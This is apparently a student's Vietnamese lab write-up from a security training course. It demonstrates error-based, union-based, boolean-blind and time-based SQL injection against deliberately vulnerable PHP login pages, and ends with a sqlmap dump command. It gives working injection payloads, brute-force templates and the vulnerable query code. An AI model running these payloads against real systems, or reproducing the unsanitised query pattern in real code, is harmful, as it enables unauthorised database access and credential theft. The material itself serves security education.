# Task 3 KCSC Training

![](https://media.geeksforgeeks.org/wp-content/uploads/20220716180638/types.PNG)

## Error based

Source code:
```php
    if(isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $conn = mysqli_connect("localhost", "root", "", "kcsc");
        $sql = "SELECT * FROM `task_3` WHERE `username` = '$username' AND `password` = '$password'";
        $resullt = mysqli_query($conn, $sql);
        echo '<center>'.mysqli_error($conn).'</center>';
        if($resullt){
            if (isset($_POST['remember'])) {
                setcookie('remember', base64_encode($username.md5($username)), time() + (86400 * 30), "/");
            } else {
                setcookie('remember', '', time() - 3600, "/");
            }

            $row = mysqli_fetch_assoc($resullt);
            if($row != 0){

                echo '<br><center>Hello brooooooooooo!</center>';
                echo '
                <div class="d-flex align-items-center justify-content-center mt-5">
                <form method="post">
                <div class="d-flex justify-content-end me-3">
                <button type="submit" class="btn btn-secondary" name="logout">Logout</button>
                </div>
                </form>
                </div>';
            } else {
                echo '<center>Wrong username or password</center>';
            }
        }
    }

    if(isset($_POST['logout'])) {
        session_destroy();
        setcookie('remember', '', time() - 3600, "/");
        header('location: lab_error_based.php');
    }
```
#### Một trong số những hướng khai thác của lab này như sau:
**Bước 1: Tìm vị trí dính sql injection**

Sau khi thử với username thì em thấy ở đây bị dính sql injection, thêm vào đó nếu em đăng nhập thành công thì dòng `Hello brooooooooooo!` sẽ hiện ra và không có thêm bất kỳ thông tin nào từ bản ghi.
![](https://i.imgur.com/cG00BpH.png)
Khi em truyền vào đó một câu truy vấn sai cấu trúc thì lỗi sẽ hiện ra, đây là dấu hiệu để em thử tấn công error based
![](https://i.imgur.com/82fe1kZ.png)

**Bước 2: Tìm tên database, tên bảng, tên cột**

Em thử bắt đầu với: 
`' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- `
Để cảnh báo được hiện ra em dựa vào `Duplicate entry for key 'group_key'` sử dụng hàm `floor(rand(0)*2)` để sinh ra chỉ 2 số là `0` hoặc `1` sau đó nối với tên database (là một giá trị cố định). Nối tên database với số được sinh random, mệnh đề `having min(0)` dùng để đưa ra điều kiện để giới hạn các bản ghi được được group.
*=> Điều này chắc chắn sẽ tạo ra một `group_key` bị trùng tại lần thứ 3 mà hàm `floor(rand(0)*2)`*
![](https://i.imgur.com/I1bhctR.png)

Ở phần `Warning` đã trả về cho em tên của database là `kcsc`

Tiếp tục với phương pháp như vậy để tìm tên bảng:
`' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc'),'-',floor(rand(0)*2)) having min(0)-- `
![](https://i.imgur.com/wDmT3iA.png)

Em nhận được tên của bảng là `task_3`

Tương tự vậy em tìm đến tên của các cột:
`' or 1=1 group by concat((select column_name from information_schema.columns where table_name='task_3' limit 2,1),'-',floor(rand(0)*2)) having min(0)-- `

![](https://i.imgur.com/Mys0iGL.png)
![](https://i.imgur.com/t2n5HEA.png)
![](https://i.imgur.com/x3YOEWQ.png)

Có ba cột và tên lần lượt là: `id`, `username` và `password`

**Bước 3: Lấy dữ liệu**

Khi đã có đủ thông tin về tên bảng, tên cột bước cuối cùng là lấy dữ liệu bằng:
`' or 1=1 group by concat((select password from task_3 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

![](https://i.imgur.com/in59Ssc.png)

*=>Vậy là em đã có được password của admin: `admin123`.*

---
## Union based
Source code:
```php
    if(isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $conn = mysqli_connect("localhost", "root", "", "kcsc");
        $sql = "SELECT * FROM `task_3` WHERE `username` = '$username' AND `password` = '$password'";
        $resullt = mysqli_query($conn, $sql);

        if($resullt){
            if (isset($_POST['remember'])) {
                setcookie('remember', base64_encode($username.md5($username)), time() + (86400 * 30), "/");
            } else {
                setcookie('remember', '', time() - 3600, "/");
            }
            if (mysqli_num_rows($resullt) != 0){
                while($row = mysqli_fetch_assoc($resullt)){
                    echo '
                    <div class="d-flex align-items-center justify-content-center mt-5">
                    Hello, '. $row['username'].'
                    </div>';
                }
                echo '<hr>';
                echo '
                <div class="d-flex align-items-center justify-content-center mt-5">
                <form method="post">
                <div class="d-flex justify-content-end me-3">
                <button type="submit" class="btn btn-secondary" name="logout">Logout</button>
                </div>
                </form>
                </div>';
            } else {
                echo '<center>Wrong username or password</center>';
            }
        } else {
            echo '<center>Wrong username or password</center>';
        }
    }

    if(isset($_POST['logout'])) {
        session_destroy();
        setcookie('remember', '', time() - 3600, "/");
        header('location: lab_union_based.php');
    }
```

![](https://i.imgur.com/GFDAwS4.png)

#### Một trong số những hướng khai thác của lab này như sau:
**Bước 1: Tìm vị trí dính sql injection**
![](https://i.imgur.com/2OcFGu7.png)

Em test với username và thấy rằng username dính sql injection 

Sau khi inject xong em thấy rằng dữ liệu trả về từ câu truy vấn được hiện ra nên em có thể thực hiện `union attack`.

**Bước 2: Tìm số cột và xác định dữ liệu được hiện ra trước đó là từ cột nào?**

Ở bước này em sử dụng `ORDER BY` để xác định số cột. 
![](https://i.imgur.com/0myFSj1.png)
Khi em `ORDER BY 1` các bản ghi được trả về từ câu truy vấn sẽ được sắp xếp theo thứ tự tăng dần dựa theo cột 1, dựa theo đó em tăng dần số cột lên `ORDER BY 2`, `ORDER BY 3`, `ORDER BY 4`,...
Tại `ORDER BY 4`, câu truy vấn trả về lỗi
![](https://i.imgur.com/KzPsvKh.png)
`Unknown column '4' in 'order clause'` vậy là không có cột thứ 4.
*=>Suy ra câu truy vấn này trả về 3 cột* 

Từ đây em bắt đầu sử dụng union và xác định xem dữ liệu được hiện ra cho em là từ cột nào:
`union select 'a',null,null -- `
`union select null,'a',null -- `
`union select null,null,'a' -- `
![](https://i.imgur.com/tc0UIyj.png)

Sau khi xác định được dữ liệu được hiện ra màn hình là từ cột thứ 2 em bắt đầu thực hiện bước tiếp theo

**Bước 3: Tìm tên bảng, tên cột**

Em tìm tên của tất cả các bảng bằng: `' union select null,table_name,null FROM information_schema.tables-- `

![](https://i.imgur.com/DzpFe6d.png)

Sau đó ghi lại những bảng mà em cho rằng có khả năng là bảng mà lưu dữ liệu em cần, ví dụ như bảng `task_3`.

Lấy tên những bảng đó và đi tìm tên cột bằng: `' union select null,column_name,null FROM information_schema.columns where table_name="task_3" -- `

![](https://i.imgur.com/wjUcASp.png)

Vậy là em đã tìm được tên của các cột có trong bảng  `task_3` là `id`, `username` và `password`.

**Bước 4: Lấy dữ liệu**

Sau khi đã có được tên bảng cũng như tên cột em dùng: `' union select null,concat(username, '~', password) ,null FROM task_3 -- ` để lấy ra `username` và `password` trong cùng 1 cột thứ 2 và được nối với nhau bằng ký tự `~`.

![](https://i.imgur.com/lsazAyb.png)

*=>Vậy là ta đã có được thông tin của admin: `admin~admin123`.*

---
## Boolean based
Source code: 
```php
    if(isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $conn = mysqli_connect("localhost", "root", "", "kcsc");
        $sql = "SELECT * FROM `task_3` WHERE `username` = '$username' AND `password` = '$password'";
        $resullt = mysqli_query($conn, $sql);   
        // $row = mysqli_num_rows($resullt);
        if($resullt) {
            if (isset($_POST['remember'])) {
                setcookie('remember', base64_encode($username.md5($username)), time() + (86400 * 30), "/");
            } else {
                setcookie('remember', '', time() - 3600, "/");
            }
            if($row = mysqli_num_rows($resullt)){

                echo '<br><center>Hello brooooooooooo!</center>';
                echo '
                <div class="d-flex align-items-center justify-content-center mt-5">
                <form method="post">
                <div class="d-flex justify-content-end me-3">
                <button type="submit" class="btn btn-secondary" name="logout">Logout</button>
                </div>
                </form>
                </div>';
            } else {
                echo '<center>Wrong username or password</center>';
            }
        } else {
            echo '<center>Wrong username or password</center>';
        }
    }

    if(isset($_POST['logout'])) {
        setcookie('remember', '', time() - 3600, "/");
        header('location: lab_boolean_based.php');
    }
```
#### Một trong số những hướng khai thác của lab này như sau:
**Bước 1: Tìm vị trí dính sql injection**

![](https://i.imgur.com/HEoIDNt.png)
![](https://i.imgur.com/ZUCdrCx.png)

Em test với username và thấy rằng username dính sql injection và dữ liệu nhận từ database không được hiện thị ra.

Nhưng nếu đăng nhập thành công em sẽ nhận được dòng thông báo là `Hello brooooooooooo!` còn nếu đăng nhập không thành công sẽ nhận được thông báo là `Wrong username or password`. Dựa vào điểm khác biệt này em bắt đầu thực hiện tấn công blind.

**Bước 2: Tìm độ dài tên bảng, tên bảng, độ dài tên cột, tên cột**

Bắt đầu với: `' OR (case when 1=1 then 1 else 0 end) -- `
![](https://i.imgur.com/IflFGnd.png)

Sau khi xác định được mệnh đề `CASE WHEN...` có thể thực thi được thì iem bắt đầu tìm độ dài của tên bẳng bằng: 
`' OR (case when (select length(table_name) from information_schema.tables where engine='InnoDB' limit 0,1)>0 then 1 else 0 end)=1 -- `

![](https://i.imgur.com/lsfpO4i.png)
*=> độ dài của tên bảng là 6*

Em bắt đâu brute force tên bảng bằng: `substring((select table_name from information_schema.tables where engine='innodb' limit 0,1),§1§,1)='§0§' then 1 else 0 end)=1 -- `
![](https://i.imgur.com/WhErlLB.png)

Start attack with payload set 1 is number from 1 to 6 and step 1; payload set 2 is list character.

![](https://i.imgur.com/iWjxWP9.png)

*=> tên bảng là `task_3`*

Em tiếp tục tìm tên cột bằng: 
`' OR (case when (select length(column_name) from information_schema.columns where table_name='task_3' limit 2,1)>7 then 1 else 0 end)=1 -- `

![](https://i.imgur.com/cqy03O8.png)

*=> độ dài của tên cột thứ nhất là 2, thứ hai là 8 và thứ ba là 8 là*

Em tiếp tục brute force tên cột bằng: 
`' OR (case when substring((select column_name from information_schema.columns where table_name='task_3' limit 2,1),§1§,1)='§0§' then 1 else 0 end)=1 -- `

![](https://i.imgur.com/Gri8pfd.png)

Em tăng dần param thứ nhất của limit: `LIMIT 0,1`, `LIMIT 1,1`, `LIMIT 2,1` để brute force tên của từng cột và được kết quả.

Cột thứ nhất: `id`
![](https://i.imgur.com/iGnDxaK.png)

Cột thứ hai: `username`
![](https://i.imgur.com/CSoyXm2.png)

Cột thứ ba: `password`
![](https://i.imgur.com/jIj69xG.png)

Sau khi đã tìm xong hết tên bảng và tên cột, em đến với bước cuối cùng

**Bước 3: Lấy dữ liệu**

Dữ liệu mà em muốn lấy ở đây là password của admin, để lấy được thì trc hết em vẫn cần biết độ dài của password, nên em dùng: 
`' OR (case when (select length(password) from task_3 limit 0,1)>7 then 1 else 0 end)=1 -- `

![](https://i.imgur.com/M1x9V3J.png)

*=> độ dài của password là 8*

Có độ dài của password rồi bước cuối cùng là brute force password thoiii:
`' OR (case when substring((select password from task_3 limit 0,1),§1§,1)='§0§' then 1 else 0 end)=1 -- `

![](https://i.imgur.com/05P4EwC.png)

Start attack và em được kết quà: `admin123`

![](https://i.imgur.com/slvuKJS.png)

*=> Vậy `admin ~ admin123` chính là thông tin đăng nhập của admin.*

---

## Time based 
Source code:
```php
    if(isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $conn = mysqli_connect("localhost", "root", "", "kcsc");
        $sql = "SELECT * FROM `task_3` WHERE `username` = '$username' AND `password` = '$password'";
        $resullt = mysqli_query($conn, $sql);   
        // $row = mysqli_num_rows($resullt);
        if($resullt) {
            if (isset($_POST['remember'])) {
                setcookie('remember', base64_encode($username.md5($username)), time() + (86400 * 30), "/");
            } else {
                setcookie('remember', '', time() - 3600, "/");
            }
            if($row = mysqli_num_rows($resullt)){
                echo '<br><center>Hello brooooooooooo!</center>';
            } else {
                echo '<br><center>Hello brooooooooooo!</center>';
            }
        } else {
            echo '<br><center>Hello brooooooooooo!</center>';
        }
    }

    if(isset($_POST['logout'])) {
        setcookie('remember', '', time() - 3600, "/");
        header('location: lab_boolean_based.php');
    }
```

#### Một trong số những hướng khai thác của lab này như sau:
**Bước 1: Tìm vị trí dính sql injection**

Ở lab này thì vị trí bị dính injection vẫn là ở username nhưng vấn đề ở đây là dù em có nhập vào input gì thì em cũng sẽ chỉ nhận được dòng `Hello brooooooooooo!`

![](https://i.imgur.com/i4oDAsn.png)

Nên em bắt đầu từ time based bằng: `' or (case when 1=2 then 1 else sleep(1) end)=1 -- `

![](https://i.imgur.com/HpsXRBe.png)

Thấy rằng response time trả về là 4 giây chứng tỏ là em đã sql injection time based thành công.

**Bước 2: Tìm tên database, tên bảng, tên cột**

Để bắt đầu tìm tên bảng em dùng: `' or (case when substring((select database() limit 0,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `

![](https://i.imgur.com/jxTchwQ.png)

Bắt những response time nào lớn hơn 4 giây và em nhận được tên database: `kcsc`

Tiếp tục với phương pháp như trên em brute force tên bảng bằng:
`' or (case when substring((select table_name from information_schema.tables where table_schema='kcsc' limit 0,1),§1§,1)='§6§' then sleep(1) else 1 end)=1 -- `

![](https://i.imgur.com/T8fBm8P.png)

Em lấy được tên bảng là: `task_3`

Sau khi đã có tên bảng em bắt đầu brute force tên cột bằng:
`' or (case when substring((select column_name from information_schema.columns where table_name='task_3' limit 2,1),§1§,1)='§p§' then sleep(1) else 1 end)=1 -- `

![](https://i.imgur.com/m5owObz.png)

Tên cột là: `password`


**Bước 3: Lấy dữ liệu**

Sau khi đã có đủ tên bảng, tên cột em đã có thể lấy được password của admin bằng:
`' or (case when substring((select password from task_3 limit 0,1),§1§,1)='§p§' then sleep(1) else 1 end)=1 -- `

![](https://i.imgur.com/TZpF5qn.png)

*=> Mật khẩu của admin là: `admin123`.*


## Mở rộng

Những hướng khai thác sql injection trên đã được tổng hợp vào trong 1 tool rất mạnh là `sqlmap`.
Với những lab này em đã thử dùng sqlmap để dump data bằng:

```c
sqlmap -u "http://192.168.200.1/trainingKCSC/task_3_lab_sqli/lab_boolean_based.php" --data="username=*&password*&login=" -dbms="MySQL" --threads 10 --batch --dump
```

`-u` url - đường dẫn đến target
`--data` dùng để gửi dữ liệu được truyền qua phương thức POST
`--dbms` dùng để khai báo loại cơ sở dữ liệu
`--threads` dùng để tùy chọn số lượng luồng
`--batch` dùng để tự động lựa chọn
`--dump` dùng để dump dữ liệu

![](https://i.imgur.com/drAmrzI.png)
